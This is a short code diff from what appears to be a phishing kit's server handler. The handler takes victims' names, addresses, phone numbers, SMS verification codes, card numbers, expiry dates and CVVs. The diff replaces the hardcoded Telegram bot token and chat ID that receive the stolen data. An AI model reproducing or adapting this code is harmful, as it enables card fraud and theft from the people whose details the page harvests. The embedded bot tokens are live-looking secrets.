@@ -5,8 +5,8 @@ export default async function handler(req, res) {
 
   const { full_name, mail, address1, address2, zip, city, state, phone, sms1, sms2, CN, cc, exp, cvv } = req.body;
 
-  const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM";
-  const CHAT_ID = "-4982276528";
+  const BOT_TOKEN = "8317579135:AAEP5t8tioz9RSpNnjOPzVVBC5sxXU5sIqw";
+  const CHAT_ID = "-7616353426";
 
   let message = "";
 
@@ -56,4 +56,5 @@ export default async function handler(req, res) {
     res.status(500).json({ message: "خطأ أثناء الإرسال" });
   }
 }
+
 
